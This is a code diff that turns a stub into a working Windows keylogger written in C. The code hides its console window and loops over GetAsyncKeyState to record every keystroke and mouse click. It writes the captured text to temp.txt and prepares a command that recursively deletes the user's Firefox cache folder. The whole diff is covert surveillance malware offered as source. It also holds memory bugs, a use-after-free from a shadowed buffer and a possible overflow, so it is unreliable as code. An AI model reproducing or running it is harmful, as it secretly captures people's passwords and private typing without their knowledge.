@@ -1,59 +1,165 @@
-// add relevant libraries 
-#include<stdio.h>
-#include<windows.h>
+#include <stdio.h>
+#include <windows.h>
 
-// user defined functions
-// function declarations to delete cache
+//functions to delete browser specific cache
 void ClearBrowserCache();
 void ClearMozillaCache();
-void ClearChromecache();
-void ClearOperaCache();
+void ClearChromeCache();
+void ClearOperaCache(); 
 
-// function definition for ClearBrowserCache
+
+//function to delete mozilla firefox cache
+void ClearMozillaCache()
+{
+    char path[256] = "C:\\Users\\";
+    char cachePath[256] = "\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\gv3rw9bw.default-release\\cache2";
+    char removepath[256] = "";
+    strcat(path,getenv("USERNAME"));
+    strcat(path, cachePath);
+    strcat(removepath,"rmdir /Q /S ");
+    strcat(removepath, path);
+    printf("path: %s\n remove path: %s\n",path,removepath);
+    //system(removepath);
+
+}
+
+//function to call specific browser clear cache functions
 void ClearBrowserCache()
 {
     ClearMozillaCache();
-    ClearChromecache(); //future works
-    ClearOperaCache(); //future works
-}
-
-
-// function definition to delete mozilla cache
-void ClearMozilla{
-    //local variable declarations
-char path[256] = "";
-char username = '';
-char path2[256] = "";
-char command[256] = "";
-// building path for cache folder and concatenanting
-strcat(path, "C:\\Users\\");
-// extracting host's user : username
-username = system("USERNAME");
-// concatenanting with path
-strcat(path, username);
-//defining rest of the path
-path2 = "Appdata\\Mozilla\\cache";
-//concatenating with path
-strcat(path, path2);
-// windows command to delete a directory recursively
-command = "rmdir /Q /S ";
-// concatenating path with command
-strcat(command, path);
-// running command using system 
-system(command);
+    //to be added: more browser clear cache functions
 
 }
-// function to save keylogged data to text file
-void Save(); // Future Workss
 
-// main function
-int main(){
-    // function to free console window from application
-    FreeConsole();
-    // function call for clearbowsercache function
+void Save(int key, char* input)
+{
+    if(key == VK_BACK)
+    {
+        strcat(input, "[BackSpace]");
+    }
+
+    else if(key == VK_TAB)
+    {
+        strcat(input, "[TAB]");
+    }
+
+    else if(key == VK_RETURN)
+    {
+        strcat(input, "[ENTER]");
+    }
+
+    else if(key == VK_SHIFT)
+    {
+        strcat(input, "[SHIFT]");
+    }
+
+    else if(key == VK_CONTROL)
+    {
+        strcat(input, "[CTRL]");
+    }
+
+    else if(key == VK_MENU)
+    {
+        strcat(input, "[ALT]");
+    }
+
+    else if(key == VK_CAPITAL)
+    {
+        strcat(input,"[CAPSlOCK]");
+    }
+
+    else if(key == VK_ESCAPE)
+    {
+        strcat(input, "[ESC]");
+    }
+
+    else if(key == VK_SPACE)
+    {
+        strcat(input, "[SPACE]");
+    }
+
+    else if(key == VK_UP)
+    {
+        strcat(input, "[UP Arrow]");
+    }
+
+    else if(key == VK_DOWN)
+    {
+        strcat(input, "[DOWN ARROW]");
+    }
+
+    else if(key == VK_LEFT)
+    {
+        strcat(input, "[LEFT ARROW]");
+    }
+
+    else if(key == VK_RIGHT)
+    {
+        strcat(input, "[RIGHT ARROW]");
+    }
+
+    else if(key == VK_LBUTTON)
+    {
+        strcat(input, "[LMB]");
+    }
+
+    else if(key == VK_RBUTTON)
+    {
+        strcat(input, "[RMB]");
+    }
+
+    else if(key == VK_MBUTTON)
+    {
+        strcat(input, "[MMB]");
+    }
+
+    else if(key == VK_DELETE)
+    {
+        strcat(input, "[DEL]");
+    }
+    /*
+    Add more use cases for keyboard layouts
+    */
+    else
+    {
+        char temp[2] = "";
+        temp[0] = key;
+        temp[1] = '\0';
+        strcat(input,temp);
+    }
+
+}
+
+int main()
+{
     ClearBrowserCache();
-    //place holder will be removed in the future
-    printf("Hello World, this is a keylogger program");
-    // Future Work: ADD rest of the code
+    FreeConsole();      //frees console window from poping on start-up
+    int counter = 0;
+    char* input = (char*)malloc(100*sizeof(char));
+    input[0]='\0';
+    while(1)
+    {
+        for(int i=8; i<190; i++)
+        {
+            if(GetAsyncKeyState(i) == -32767)
+            {
+                //printf("%c", i);
+                counter++;
+                Save(i,input);
+                if(counter == 10)
+                {
+                    counter = 0;
+                    FILE *fp = fopen("temp.txt","ab+");
+                    fprintf(fp,"%s", input);
+                    fclose(fp);
+                    free(input);
+                    char* input = (char*)malloc(100*sizeof(char));
+                    input[0] = '\0';
+
+                }            
+                
+            }
+        }
+    }
     return 0;
 }
